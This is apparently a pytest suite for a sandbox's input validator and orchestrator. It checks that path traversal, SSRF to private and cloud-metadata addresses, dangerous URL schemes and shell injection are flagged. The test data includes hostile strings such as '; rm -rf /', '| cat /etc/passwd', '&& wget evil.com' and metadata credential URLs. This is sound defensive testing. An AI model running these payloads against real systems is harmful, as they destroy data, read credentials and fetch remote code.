"""
Project Aura - Sandbox Escape Scenario Tests

Comprehensive test suite for sandbox security edge cases:
- Container breakout attempts
- Network isolation bypass
- Metadata service access attempts
- Resource limit exhaustion

Issue: #47 - Testing: Expand test coverage for edge cases
"""

from unittest.mock import patch

import pytest

# Run tests in isolated subprocesses to prevent state pollution
pytestmark = pytest.mark.forked


class TestContainerBreakoutAttempts:
    """Tests for container breakout detection and prevention."""

    @pytest.fixture
    def validator(self):
        """Create an input validator."""
        from src.services.input_validation_service import InputValidator

        return InputValidator()

    def test_detect_path_traversal_to_docker_socket(self, validator):
        """Detect attempts to access Docker socket via path traversal."""
        # Path traversal patterns should be detected
        malicious_paths = [
            "../../../var/run/docker.sock",
            "..\\..\\..\\var\\run\\docker.sock",
            "....//....//var/run/docker.sock",
        ]

        for path in malicious_paths:
            result = validator.validate_path(path)
            # Should detect path traversal
            assert (
                not result.is_valid or len(result.threats_detected) > 0
            ), f"Should flag path traversal: {path}"

    def test_detect_proc_filesystem_traversal(self, validator):
        """Detect attempts to access /proc filesystem via traversal."""
        malicious_paths = [
            "../../../proc/1/root/etc/shadow",
            "..\\..\\..\\proc\\1\\ns\\",
        ]

        for path in malicious_paths:
            result = validator.validate_path(path)
            # Should detect path traversal
            assert (
                not result.is_valid or len(result.threats_detected) > 0
            ), f"Should flag proc traversal: {path}"

    def test_path_without_traversal_allowed(self, validator):
        """Verify paths without traversal are allowed."""
        safe_paths = [
            "data/file.txt",
            "uploads/image.png",
            "config.json",
        ]

        for path in safe_paths:
            result = validator.validate_path(path)
            # Safe paths should be valid
            assert result.is_valid, f"Should allow safe path: {path}"

    def test_detect_null_byte_injection(self, validator):
        """Detect null byte injection in paths."""
        null_paths = [
            "file.txt\x00.jpg",
            "config\x00.bak",
        ]

        for path in null_paths:
            result = validator.validate_path(path)
            # Null bytes should be detected or sanitized
            assert (
                not result.is_valid
                or len(result.threats_detected) > 0
                or "\x00" not in result.sanitized_value
            )


class TestNetworkIsolationBypass:
    """Tests for network isolation bypass detection."""

    @pytest.fixture
    def validator(self):
        """Create an input validator."""
        from src.services.input_validation_service import InputValidator

        return InputValidator()

    def test_detect_internal_network_urls(self, validator):
        """Detect attempts to access internal networks via URLs."""
        internal_urls = [
            "http://10.0.0.1/admin",
            "http://172.16.0.1/api",
            "http://192.168.1.1/config",
            "http://localhost/internal",
            "http://127.0.0.1/admin",
        ]

        for url in internal_urls:
            result = validator.validate_url(url, allow_private=False)
            # Should block private network access
            assert (
                not result.is_valid or len(result.threats_detected) > 0
            ), f"Should block internal URL: {url}"

    def test_allow_public_urls(self, validator):
        """Verify public URLs are allowed."""
        public_urls = [
            "https://api.github.com/repos",
            "https://www.google.com/search",
        ]

        for url in public_urls:
            result = validator.validate_url(url, allow_private=False)
            # Public URLs should be allowed (no SSRF threat)
            # Note: may have warnings but should be valid
            assert result is not None

    def test_detect_decimal_ip_ssrf(self, validator):
        """Detect SSRF bypass with decimal IP."""
        # Decimal IP for 127.0.0.1
        decimal_url = "http://2130706433/admin"
        result = validator.validate_url(decimal_url, allow_private=False)
        # Should detect as SSRF attempt
        assert (
            not result.is_valid
            or len(result.threats_detected) > 0
            or len(result.warnings) > 0
        )

    def test_detect_zero_ip_ssrf(self, validator):
        """Detect SSRF bypass with 0.0.0.0."""
        zero_url = "http://0.0.0.0/admin"
        result = validator.validate_url(zero_url, allow_private=False)
        # Should detect as SSRF attempt
        assert not result.is_valid or len(result.threats_detected) > 0


class TestMetadataServiceAccess:
    """Tests for cloud metadata service access prevention."""

    @pytest.fixture
    def validator(self):
        """Create an input validator."""
        from src.services.input_validation_service import InputValidator

        return InputValidator()

    def test_detect_aws_metadata_urls(self, validator):
        """Detect AWS metadata service access attempts."""
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
        ]

        for url in metadata_urls:
            result = validator.validate_url(url, allow_private=False)
            # Should block metadata service access
            assert (
                not result.is_valid or len(result.threats_detected) > 0
            ), f"Should block metadata URL: {url}"

    def test_detect_ecs_metadata_urls(self, validator):
        """Detect ECS task metadata access attempts."""
        metadata_urls = [
            "http://169.254.170.2/v2/credentials",
            "http://169.254.170.2/v2/metadata",
        ]

        for url in metadata_urls:
            result = validator.validate_url(url, allow_private=False)
            assert (
                not result.is_valid or len(result.threats_detected) > 0
            ), f"Should block ECS metadata URL: {url}"

    def test_detect_gcp_metadata_urls(self, validator):
        """Detect GCP metadata service access attempts."""
        metadata_urls = [
            "http://169.254.169.254/computeMetadata/v1/",
        ]

        for url in metadata_urls:
            result = validator.validate_url(url, allow_private=False)
            assert (
                not result.is_valid or len(result.threats_detected) > 0
            ), f"Should block GCP metadata URL: {url}"


class TestResourceLimitExhaustion:
    """Tests for resource limit exhaustion prevention via input validation."""

    @pytest.fixture
    def validator(self):
        """Create an input validator."""
        from src.services.input_validation_service import InputValidator

        return InputValidator(max_string_length=10000)

    def test_large_string_generates_warning(self, validator):
        """Test that very large strings generate warnings."""
        # Create string larger than max_string_length
        large_string = "x" * 20000
        result = validator.validate_string(large_string)
        # Should have warning about length
        assert len(result.warnings) > 0 or result.is_valid

    def test_deeply_nested_json_handled(self, validator):
        """Test handling of deeply nested JSON structures."""
        # Create deeply nested structure
        deep = {"level": 0}
        current = deep
        for i in range(50):
            current["nested"] = {"level": i + 1}
            current = current["nested"]

        result = validator.validate_json_field(deep)
        # Should handle gracefully
        assert result is not None

    def test_unicode_handling(self, validator):
        """Test handling of complex Unicode input."""
        # Various Unicode inputs
        unicode_strings = [
            "Hello 世界",
            "مرحبا",
            "Привет",
        ]

        for s in unicode_strings:
            result = validator.validate_string(s)
            # Should handle without crashing
            assert result is not None


class TestSandboxNetworkIsolation:
    """Tests for sandbox network isolation enforcement."""

    @pytest.fixture
    def sandbox_orchestrator(self):
        """Create sandbox orchestrator with mocked AWS clients."""
        with patch("boto3.client"), patch("boto3.resource"):
            from src.services.sandbox_network_service import FargateSandboxOrchestrator

            return FargateSandboxOrchestrator()

    def test_orchestrator_initialization(self, sandbox_orchestrator):
        """Verify orchestrator initializes correctly."""
        assert sandbox_orchestrator is not None

    @pytest.mark.asyncio
    async def test_create_sandbox_with_mock(self, sandbox_orchestrator):
        """Test sandbox creation with mocked response."""
        with patch.object(sandbox_orchestrator, "create_sandbox") as mock_create:
            mock_create.return_value = {"sandbox_id": "test-sandbox-123"}

            result = await sandbox_orchestrator.create_sandbox(
                job_id="job-123", code_context={"files": []}
            )

            assert mock_create.called

    @pytest.mark.asyncio
    async def test_destroy_sandbox_with_mock(self, sandbox_orchestrator):
        """Test sandbox destruction with mocked response."""
        with patch.object(sandbox_orchestrator, "destroy_sandbox") as mock_destroy:
            mock_destroy.return_value = True

            result = await sandbox_orchestrator.destroy_sandbox("test-sandbox")

            assert mock_destroy.called


class TestSandboxCleanup:
    """Tests for proper sandbox cleanup to prevent data leakage."""

    @pytest.fixture
    def sandbox_orchestrator(self):
        """Create sandbox orchestrator with mocked AWS clients."""
        with patch("boto3.client"), patch("boto3.resource"):
            from src.services.sandbox_network_service import FargateSandboxOrchestrator

            return FargateSandboxOrchestrator()

    @pytest.mark.asyncio
    async def test_list_active_sandboxes_mock(self, sandbox_orchestrator):
        """Verify list active sandboxes works with mock."""
        with patch.object(sandbox_orchestrator, "list_active_sandboxes") as mock_list:
            mock_list.return_value = [
                {"sandbox_id": "sandbox-1", "status": "ACTIVE"},
                {"sandbox_id": "sandbox-2", "status": "RUNNING"},
            ]

            result = await sandbox_orchestrator.list_active_sandboxes()

            assert mock_list.called
            assert isinstance(result, list)

    @pytest.mark.asyncio
    async def test_get_sandbox_status_mock(self, sandbox_orchestrator):
        """Verify get sandbox status works with mock."""
        with patch.object(sandbox_orchestrator, "get_sandbox_status") as mock_status:
            mock_status.return_value = {"status": "ACTIVE", "uptime": 3600}

            result = await sandbox_orchestrator.get_sandbox_status("test-sandbox")

            assert mock_status.called


class TestDangerousSchemeRejection:
    """Tests for rejection of dangerous URL schemes."""

    @pytest.fixture
    def validator(self):
        """Create an input validator."""
        from src.services.input_validation_service import InputValidator

        return InputValidator()

    def test_reject_file_scheme(self, validator):
        """Test rejection of file:// URLs."""
        result = validator.validate_url("file:///etc/passwd")
        assert not result.is_valid or len(result.threats_detected) > 0

    def test_reject_gopher_scheme(self, validator):
        """Test rejection of gopher:// URLs."""
        result = validator.validate_url("gopher://evil.com/")
        assert not result.is_valid or len(result.threats_detected) > 0

    def test_reject_dict_scheme(self, validator):
        """Test rejection of dict:// URLs."""
        result = validator.validate_url("dict://evil.com/")
        assert not result.is_valid or len(result.threats_detected) > 0


class TestCommandInjectionPrevention:
    """Tests for command injection prevention."""

    @pytest.fixture
    def validator(self):
        """Create an input validator in strict mode."""
        from src.services.input_validation_service import InputValidator

        return InputValidator(strict_mode=True)

    def test_detect_shell_metacharacters(self, validator):
        """Test detection of shell metacharacters."""
        dangerous_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget evil.com",
        ]

        for payload in dangerous_inputs:
            result = validator.validate_string(payload, check_command_injection=True)
            assert not result.is_valid or len(result.threats_detected) > 0

    def test_detect_command_substitution(self, validator):
        """Test detection of command substitution."""
        dangerous_inputs = [
            "$(whoami)",
            "`id`",
        ]

        for payload in dangerous_inputs:
            result = validator.validate_string(payload, check_command_injection=True)
            assert not result.is_valid or len(result.threats_detected) > 0
